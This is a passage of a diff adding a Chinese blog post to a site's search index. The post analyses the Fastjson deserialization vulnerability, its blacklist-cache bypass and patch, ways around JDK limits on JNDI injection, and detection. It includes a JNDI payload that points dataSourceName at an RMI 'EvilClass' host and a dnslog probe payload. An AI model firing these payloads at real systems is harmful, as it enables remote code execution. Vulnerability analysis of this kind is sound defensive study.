+                <span class="token operator">+</span> <span class="token string">"\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\",\"autoCommit\":true}}"</span><span class="token punctuation">;</span>
+        JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>满足版本的情况下，也能执行成功，来看一下关键的绕过代码</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201145825818.png"></p>
+<p>在判断<code>java.lang.Class</code>的时候，跟前面步骤一样，会将<code>com.sun.rowset.JdbcRowSetImpl</code>加入缓存；关键在于遍历第二个json，即<code>com.sun.rowset.JdbcRowSetImpl</code>时，是怎么绕过黑名单的？<br>看下面关键判断语句，发现第一个条件是为true的，因为<code>com.sun.rowset.JdbcRowSetImpl</code>在黑名单中，但是第二个判断条件为false，因为<code>com.sun.rowset.JdbcRowSetImpl</code>在map缓存中是找得到的，从而导致这个黑名单判断语句失效。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>为什么1.2.25-1.2.32版本开启AutoTypeSupport反而不能成功触发？</strong></p>
+<p>对比发现正是因为这个判断位置不一样，少了个判断条件，即<code>TypeUtils.getClassFromMapping(typeName) == null</code></p>
+<h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><p>针对上述问题，<code>1.2.48</code>中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</p>
+<h2 id="高版本JDK绕过思路"><a href="#高版本JDK绕过思路" class="headerlink" title="高版本JDK绕过思路"></a>高版本JDK绕过思路</h2><p>由之前利用的PoC知道，利用范围最广的PoC是基于<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链的，而这种利用方式是基于JNDI注入漏洞的，是需要我们有RMI服务或LDAP服务。</p>
+<p>这样就会导致一个限制的问题，即JNDI注入漏洞利用的限制问题——JDK版本。</p>
+<p>由之前的分析知道，JDK对于JNDI注入漏洞在不同版本有着不同的防御措施：</p>
+<ul>
+<li>JDK 6u45、7u21之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的<code>java.rmi.server.codebase</code>指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>
+<li>JDK 6u141、7u131、8u121之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
+<li>JDK 6u211、7u201、8u191之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>
+</ul>
+<p>因此，相比之下，我们在Fastjson反序列化漏洞的基于<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链上，更倾向于使用LDAP服务来实现攻击利用，因为其对于JDK的适用范围更广。</p>
+<p>但是如果目标环境的JDK版本在6u211、7u201、8u191之后，我们是不是就没有办法绕过了呢？</p>
+<p>当然是有的，参考：<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">如何绕过高版本JDK的限制进行JNDI注入利用</a></p>
+<p>主要是有两种方式：</p>
+<ul>
+<li>利用本地Class作为Reference Factory</li>
+<li>利用LDAP返回序列化数据，触发本地Gadget</li>
+</ul>
+<p>具体可参考另一篇文章：<a href="http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/">浅析高低版JDK下的JNDI注入及绕过</a></p>
+<h2 id="检测思路"><a href="#检测思路" class="headerlink" title="检测思路"></a>检测思路</h2><h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><p>全局搜索是否使用到了Fastjson，若使用了则进一步排查是否为漏洞版本号即1.2.22-1.2.47，若是则可能存在反序列化漏洞的风险，需进一步排查。</p>
+<p>全局搜索如下关键代码，若存在则进一步排查参数是否外部可控：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
+JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>
+JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h3><p>1.HTTP请求包如果是JSON格式的数据，就有可能是Fastjson。</p>
+<p>2.抓到包以后，将请求方法改为POST；请求头部<code>Content-Type</code>字段修改为<code>Content-Type: application/json</code>；如下删除json格式包的一半，观察报错是否有fastjson之类的特征。</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
+<span class="token property">"name"</span><span class="token operator">:</span>"<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>3.<code>java.net.InetAddress</code>这个类在实例化时会尝试作对example.com做域名解析，这时候可以通过dnslog的方式得知漏洞是否存在。</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
+    <span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">{</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.InetAddress"</span><span class="token punctuation">,</span>
+        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"i1q73g.dnslog.cn"</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Fastjson系列：<a href="http://www.mi1k7ea.com/archives/2019/">http://www.mi1k7ea.com/archives/2019/</a></p>
+<p>Fastjson反序列化漏洞的调试与分析：<a href="https://blog.csdn.net/qq_34101364/article/details/111706189">https://blog.csdn.net/qq_34101364/article/details/111706189</a></p>
+<p>Fastjson系列-漏洞复现：<a href="https://www.freebuf.com/vuls/358459.html">https://www.freebuf.com/vuls/358459.html</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>细读经典</category>
+      </categories>
+      <tags>
+        <tag>JNDI注入</tag>
+        <tag>Fastjson</tag>
+      </tags>
+  </entry>
 </search>
